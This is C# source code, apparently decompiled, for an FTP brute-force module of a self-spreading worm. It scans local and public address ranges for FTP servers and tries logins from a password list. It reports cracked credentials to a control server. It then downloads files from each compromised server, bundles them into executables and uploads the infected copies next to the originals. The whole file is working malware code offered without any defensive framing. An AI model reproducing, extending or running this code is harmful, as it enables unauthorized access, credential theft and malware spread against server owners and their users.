using System;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using Leb128;
using SmbWorm;
using SmbWorm.Smb;
using Worm2.Files;

namespace Plugin.Helper;

internal class FtpBrute
{
	public static string WebIpInfo()
	{
		try
		{
			return Regex.Match(new WebClient().DownloadString("http://ipinfo.io"), "\"ip\": \"(.*)\"").Groups[1].Value;
		}
		catch
		{
			return "null";
		}
	}

	public static void Run()
	{
		IpLocalHost ipLocalHost = new IpLocalHost();
		ScanHosts scanHosts = new ScanHosts();
		scanHosts.SuccuesScan += SuccuesScan;
		scanHosts.SuccuesScan += delegate(string ip, int port)
		{
			Client.Send(LEB128.Write(new object[2]
			{
				"WormLog1",
				"Tcp Scaner: Open port " + ip + ":" + port
			}));
		};
		string[] array = WebIpInfo().Split(new char[1] { '.' });
		scanHosts.Scan(ipLocalHost.IPAddressesRange(), 21);
		scanHosts.Scan(ipLocalHost.IPAddressesRange(new IPAddress(new byte[4]
		{
			Convert.ToByte(array[0]),
			Convert.ToByte(array[1]),
			Convert.ToByte(array[2]),
			0
		}), new IPAddress(new byte[4]
		{
			Convert.ToByte(array[0]),
			Convert.ToByte(array[1]),
			Convert.ToByte(array[2]),
			255
		})), 21);
	}

	public static void SuccuesScan(string Host, int port)
	{
		CancellationTokenSource cancellationTokenSource = new CancellationTokenSource();
		string[] passwords = PasswordList.passwords;
		foreach (string password in passwords)
		{
			Parallel.ForEach(PasswordList.passwords, new ParallelOptions
			{
				MaxDegreeOfParallelism = 20,
				CancellationToken = cancellationTokenSource.Token
			}, delegate(string login)
			{
				FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create("ftp://" + Host + "/");
				ftpWebRequest.Credentials = new NetworkCredential(login, password);
				try
				{
					ftpWebRequest.Method = "NLST";
					ftpWebRequest.Credentials = new NetworkCredential(login, password);
					ftpWebRequest.GetResponse();
					cancellationTokenSource.Cancel();
					SuccuesBrute(Host, login, password);
				}
				catch
				{
				}
			});
		}
	}

	public static void SuccuesBrute(string ips, string login, string password)
	{
		Client.Send(LEB128.Write(new object[2]
		{
			"WormLog1",
			"Brute It: ftp:\\" + ips + "@" + login + ":" + password
		}));
		ReplaceFilesRecursively("ftp://" + ips, "/", login, password);
	}

	private static void ReplaceFilesRecursively(string ftpHost, string remoteDirectory, string username, string password)
	{
		FtpWebRequest obj = (FtpWebRequest)WebRequest.Create(ftpHost + remoteDirectory);
		obj.Method = "LIST";
		obj.Credentials = new NetworkCredential(username, password);
		using FtpWebResponse ftpWebResponse = (FtpWebResponse)obj.GetResponse();
		using StreamReader streamReader = new StreamReader(ftpWebResponse.GetResponseStream());
		while (!streamReader.EndOfStream)
		{
			string[] array = streamReader.ReadLine().Split(new char[1] { ' ' }, 9, StringSplitOptions.RemoveEmptyEntries);
			string text = array[8];
			string obj2 = array[0];
			string text2 = remoteDirectory + text;
			if (obj2[0] == 'd')
			{
				try
				{
					ReplaceFilesRecursively(ftpHost, text2 + "/", username, password);
				}
				catch
				{
				}
				continue;
			}
			byte[] array2 = DownloadFileBytes(ftpHost, text2, username, password);
			if (array2 != null)
			{
				byte[] array3 = Joiner.Compiler(array2, Path.GetExtension(text2));
				if (array3 != null)
				{
					UploadFile(ftpHost, text2 + ".exe", array3, username, password);
					Client.Send(LEB128.Write(new object[2]
					{
						"WormLog2",
						"File infected ftp: " + ftpHost + "@" + username + ":" + password + "\\" + text2.Replace("/", "\\")
					}));
				}
			}
		}
	}

	private static void UploadFile(string ftpHost, string remoteFilePath, byte[] fileContents, string username, string password)
	{
		try
		{
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(ftpHost + remoteFilePath);
			ftpWebRequest.Method = "STOR";
			ftpWebRequest.Credentials = new NetworkCredential(username, password);
			ftpWebRequest.ContentLength = fileContents.Length;
			using (Stream stream = ftpWebRequest.GetRequestStream())
			{
				stream.Write(fileContents, 0, fileContents.Length);
			}
			using ((FtpWebResponse)ftpWebRequest.GetResponse())
			{
			}
		}
		catch
		{
		}
	}

	private static byte[] DownloadFileBytes(string ftpHost, string remoteFilePath, string username, string password)
	{
		try
		{
			FtpWebRequest obj = (FtpWebRequest)WebRequest.Create(ftpHost + remoteFilePath);
			obj.Method = "RETR";
			obj.Credentials = new NetworkCredential(username, password);
			using FtpWebResponse ftpWebResponse = (FtpWebResponse)obj.GetResponse();
			using Stream stream = ftpWebResponse.GetResponseStream();
			using MemoryStream memoryStream = new MemoryStream();
			stream.CopyTo(memoryStream);
			return memoryStream.ToArray();
		}
		catch
		{
		}
		return null;
	}
}
